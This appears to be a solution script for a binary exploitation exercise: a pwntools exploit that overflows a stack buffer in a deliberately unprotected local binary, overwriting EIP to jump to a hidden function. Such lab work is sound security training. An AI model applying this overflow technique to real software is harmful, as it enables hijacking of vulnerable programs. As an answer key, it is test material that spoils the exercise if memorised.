"""
Challenge 3: Overwrite the EIP register

SOLUTION
"""

from pwn import *

context.update(arch='i386', os='linux')
pty = process.PTY
elf = context.binary = ELF("./binaries/binary-3-no-protection")
p = process(elf.path)

print("Craft payload")
address_of_secret_function = 0x80491b6
offset_eip = 20
payload = b'A'*offset_eip + p32(address_of_secret_function)

print("Send payload")
p.sendline(payload)

print("Receive output")
print(p.recvline())
